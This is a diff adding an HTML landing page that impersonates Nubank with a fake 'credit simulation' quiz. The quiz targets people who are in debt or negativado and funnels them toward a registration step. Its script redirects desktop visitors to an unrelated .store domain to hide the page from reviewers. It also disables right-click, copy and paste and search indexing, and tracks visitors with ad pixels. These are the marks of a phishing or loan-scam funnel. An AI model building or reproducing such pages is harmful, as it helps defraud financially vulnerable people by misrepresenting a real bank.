@@ -1,0 +1,801 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5HHS3G78');</script>
+<!-- End Google Tag Manager -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank - Simulação de Crédito</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #9903d6 0%, #7c02b7 100%);
+            color: #333;
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .app-container {
+            max-width: 414px;
+            margin: 0 auto;
+            background: #f8f9fa;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 30px rgba(0,0,0,0.2);
+        }
+
+        /* Status Bar */
+        .status-bar {
+            background: #9903d6;
+            height: 44px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .status-left {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .status-right {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* Header */
+        .app-header {
+            background: linear-gradient(135deg, #9903d6 0%, #7c02b7 100%);
+            padding: 20px 24px 30px;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .app-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 200px;
+            height: 200px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            z-index: 1;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 20px;
+            font-weight: 800;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #9903d6;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 16px;
+        }
+
+        .header-btn {
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.2);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-btn:hover {
+            background: rgba(255,255,255,0.3);
+            transform: scale(1.05);
+        }
+
+        .header-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .header-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .header-subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            font-weight: 400;
+        }
+
+        /* Main Content */
+        .main-content {
+            background: white;
+            border-radius: 24px 24px 0 0;
+            margin-top: -20px;
+            position: relative;
+            z-index: 3;
+            min-height: calc(100vh - 200px);
+            padding: 32px 24px 100px;
+        }
+
+        .content-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .content-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .content-subtitle {
+            font-size: 16px;
+            color: #666;
+            font-weight: 400;
+        }
+
+        /* Question Card */
+        .question-card {
+            background: white;
+            border-radius: 20px;
+            padding: 28px 24px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border: 1px solid #f0f0f0;
+            margin-bottom: 24px;
+            animation: slideInUp 0.6s ease-out;
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .question-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 24px;
+            text-align: center;
+            line-height: 1.3;
+        }
+
+        /* Option Buttons */
+        .option-btn {
+            width: 100%;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 16px;
+            padding: 18px 20px;
+            margin-bottom: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .option-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(153,3,214,0.1), transparent);
+            transition: left 0.5s;
+        }
+
+        .option-btn:hover::before {
+            left: 100%;
+        }
+
+        .option-btn:hover {
+            border-color: #9903d6;
+            background: #f8f6ff;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(153,3,214,0.15);
+        }
+
+        .option-btn:active {
+            transform: translateY(0);
+            background: #9903d6;
+            color: white;
+            border-color: #9903d6;
+        }
+
+        .option-icon {
+            font-size: 18px;
+            opacity: 0.7;
+        }
+
+        /* Success Card */
+        .success-card {
+            background: linear-gradient(135deg, #00c851 0%, #00a841 100%);
+            color: white;
+            border-radius: 20px;
+            padding: 32px 24px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0,200,81,0.3);
+            animation: successPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes successPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
+            color: #00c851;
+            animation: bounce 1s ease-in-out;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 12px;
+        }
+
+        .success-subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 24px;
+        }
+
+        /* Continue Button */
+        .continue-btn {
+            background: linear-gradient(135deg, #9903d6 0%, #7c02b7 100%);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            padding: 18px 32px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 20px rgba(153,3,214,0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .continue-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .continue-btn:hover::before {
+            left: 100%;
+        }
+
+        .continue-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(153,3,214,0.6);
+        }
+
+        .continue-btn:active {
+            transform: translateY(-1px);
+        }
+
+        /* Progress Indicator */
+        .progress-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .progress-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #e9ecef;
+            transition: all 0.3s ease;
+        }
+
+        .progress-dot.active {
+            background: #9903d6;
+            transform: scale(1.2);
+        }
+
+        /* Footer */
+        .app-footer {
+            background: #9903d6;
+            color: white;
+            text-align: center;
+            padding: 32px 24px;
+            margin-top: auto;
+        }
+
+        .footer-logo {
+            width: 60px;
+            height: 60px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .footer-text {
+            font-size: 14px;
+            opacity: 0.9;
+            line-height: 1.5;
+        }
+
+        /* Security Badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 16px;
+        }
+
+        /* Hidden sections */
+        .page-section {
+            display: none;
+        }
+
+        .page-section.active {
+            display: block;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 375px) {
+            .app-container {
+                max-width: 100%;
+            }
+            
+            .main-content {
+                padding: 24px 20px 80px;
+            }
+            
+            .question-card {
+                padding: 24px 20px;
+            }
+        }
+
+        /* Loading animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 1000;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+           <!-- Header -->
+        <div class="app-header">
+            <div class="header-top">
+                <div class="logo">
+                    <div class="logo-icon">Nu</div>
+                    <span>Nubank</span>
+                </div>
+                <div class="header-actions">
+                    <button class="header-btn">
+                        <i class="fas fa-bell"></i>
+                    </button>
+                    <button class="header-btn">
+                        <i class="fas fa-user-circle"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="header-content">
+                <h1 class="header-title">Simulação de Crédito</h1>
+                <p class="header-subtitle">Descubra seu limite em menos de 5 minutos</p>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="content-header">
+                <h2 class="content-title">Vamos começar!</h2>
+                <p class="content-subtitle">Responda algumas perguntas para verificar seu crédito disponível</p>
+            </div>
+
+            <!-- Progress Indicator -->
+            <div class="progress-container">
+                <div class="progress-dot active" id="dot1"></div>
+                <div class="progress-dot" id="dot2"></div>
+                <div class="progress-dot" id="dot3"></div>
+                <div class="progress-dot" id="dot4"></div>
+                <div class="progress-dot" id="dot5"></div>
+            </div>
+
+            <!-- Page 1: Importância -->
+            <div id="pagOne" class="page-section active">
+                <div class="question-card">
+                    <h3 class="question-title">O que é mais importante para você em um empréstimo?</h3>
+                    <button class="option-btn" onclick="nextPage('pagTwo', 2)">
+                        <span>Limite de crédito alto</span>
+                        <i class="fas fa-chart-line option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('pagTwo', 2)">
+                        <span>Crédito imediato</span>
+                        <i class="fas fa-bolt option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('pagTwo', 2)">
+                        <span>Não consultar SPC/Serasa</span>
+                        <i class="fas fa-shield-alt option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('pagTwo', 2)">
+                        <span>Juros baixos</span>
+                        <i class="fas fa-percentage option-icon"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Page 2: Motivo -->
+            <div id="pagTwo" class="page-section">
+                <div class="question-card">
+                    <h3 class="question-title">Qual o motivo do empréstimo?</h3>
+                    <button class="option-btn" onclick="nextPage('rendaMensal', 3)">
+                        <span>Pagar dívidas</span>
+                        <i class="fas fa-credit-card option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('rendaMensal', 3)">
+                        <span>Comprar veículo</span>
+                        <i class="fas fa-car option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('rendaMensal', 3)">
+                        <span>Reformar a casa</span>
+                        <i class="fas fa-home option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('rendaMensal', 3)">
+                        <span>Compras em geral</span>
+                        <i class="fas fa-shopping-bag option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('rendaMensal', 3)">
+                        <span>Investir em um negócio</span>
+                        <i class="fas fa-briefcase option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('rendaMensal', 3)">
+                        <span>Pagar cartão de crédito</span>
+                        <i class="fas fa-credit-card option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('rendaMensal', 3)">
+                        <span>Outro motivo</span>
+                        <i class="fas fa-ellipsis-h option-icon"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Page 3: Experiência Nubank -->
+            <div id="rendaMensal" class="page-section">
+                <div class="question-card">
+                    <h3 class="question-title">Você já fez empréstimo na Nubank?</h3>
+                    <button class="option-btn" onclick="nextPage('negativado', 4)">
+                        <span>Sim, já sou cliente</span>
+                        <i class="fas fa-check-circle option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('negativado', 4)">
+                        <span>Não, seria o primeiro</span>
+                        <i class="fas fa-user-plus option-icon"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Page 4: Situação CPF -->
+            <div id="negativado" class="page-section">
+                <div class="question-card">
+                    <h3 class="question-title">Você está negativado?</h3>
+                    <button class="option-btn" onclick="nextPage('conclusao', 5)">
+                        <span>Sim, tenho restrições</span>
+                        <i class="fas fa-exclamation-triangle option-icon"></i>
+                    </button>
+                    <button class="option-btn" onclick="nextPage('conclusao', 5)">
+                        <span>Não, CPF limpo</span>
+                        <i class="fas fa-check-circle option-icon"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Page 5: Conclusão -->
+            <div id="conclusao" class="page-section">
+                <div class="success-card">
+                    <div class="success-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h3 class="success-title">Temos uma proposta para você!</h3>
+                    <p class="success-subtitle">Conclua seu cadastro e faça a simulação do seu crédito disponível agora!</p>
+                    <button class="continue-btn" onclick="redirectToContinue()">
+                        <span id="btnText">Continuar Simulação</span>
+                        <div class="loading" id="loading" style="display: none;"></div>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="app-footer">
+            <div class="footer-logo">Nu</div>
+            <div class="footer-text">
+                © 2025 Nu Pagamentos S.A - Instituição de Pagamento<br>
+                18.236.120/0001-58 - São Paulo, SP - 05409-000
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>Seus dados estão protegidos</span>
+            </div>
+        </div>
+    
+
+    <script>
+        let currentStep = 1;
+
+        function nextPage(pageId, step) {
+            // Update progress
+            updateProgress(step);
+            
+            // Hide all pages
+            document.querySelectorAll('.page-section').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show target page with animation delay
+            setTimeout(() => {
+                document.getElementById(pageId).classList.add('active');
+            }, 300);
+            
+            currentStep = step;
+        }
+
+        function updateProgress(step) {
+            // Reset all dots
+            document.querySelectorAll('.progress-dot').forEach(dot => {
+                dot.classList.remove('active');
+            });
+            
+            // Activate dots up to current step
+            for(let i = 1; i <= step; i++) {
+                document.getElementById(`dot${i}`).classList.add('active');
+            }
+        }
+
+        function redirectToContinue() {
+            const btn = document.querySelector('.continue-btn');
+            const btnText = document.getElementById('btnText');
+            const loading = document.getElementById('loading');
+            
+            // Show loading state
+            btnText.style.display = 'none';
+            loading.style.display = 'inline-block';
+            btn.disabled = true;
+            
+            // Simulate loading and redirect
+            setTimeout(() => {
+                window.location.href = '../7';
+            }, 2000);
+        }
+
+        // Store UTM parameters
+        function storeUTMParams() {
+            const params = new URLSearchParams(window.location.search);
+            const utmParams = {};
+
+            params.forEach((value, key) => {
+                if (key.startsWith('utm_')) {
+                    utmParams[key] = value;
+                }
+            });
+
+            localStorage.setItem('utmParams', JSON.stringify(utmParams));
+            console.log('Parâmetros UTM armazenados:', utmParams);
+        }
+
+        // Desktop redirect
+        if (window.innerWidth >= 1024) {
+            window.location.href = "https://atendimentoonline.store/blog/";
+        }
+
+        // Security measures
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && (e.key === 'c' || e.key === 'v')) {
+                e.preventDefault();
+            }
+        });
+
+        document.body.style.userSelect = "none";
+
+        // Initialize
+        window.onload = function() {
+            storeUTMParams();
+            
+            // Show welcome notification
+            setTimeout(() => {
+                const notification = document.createElement('div');
+                notification.className = 'notification';
+                notification.textContent = '🎉 Bem-vindo ao Nubank!';
+                document.body.appendChild(notification);
+                
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+            }, 1000);
+        };
+
+        // Add haptic feedback simulation for mobile
+        document.querySelectorAll('.option-btn, .continue-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                if (navigator.vibrate) {
+                    navigator.vibrate(50);
+                }
+            });
+        });
+    </script>
+<!-- Pixel Meta + UTMify com deduplicação -->
+<script>
+  // Gera um eventID único para deduplicação
+  const eventId = 'page-' + Date.now();
+
+  // --- Meta Pixel ---
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+  
+  fbq('init', '1607974976562499');
+  fbq('track', 'PageView', {}, {eventID: eventId});
+
+  // --- UTMify Pixel ---
+  window.pixelId = "684c7d3bb21e8e0cccb36251";
+  window.eventID = eventId; // mesmo ID para deduplicação
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1607974976562499&ev=PageView&noscript=1"/>
+</noscript>
+    <!-- Meta tags for security -->
+    <meta name="robots" content="noindex, nofollow">
+    
+    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains">
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5HHS3G78"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+</body></html>
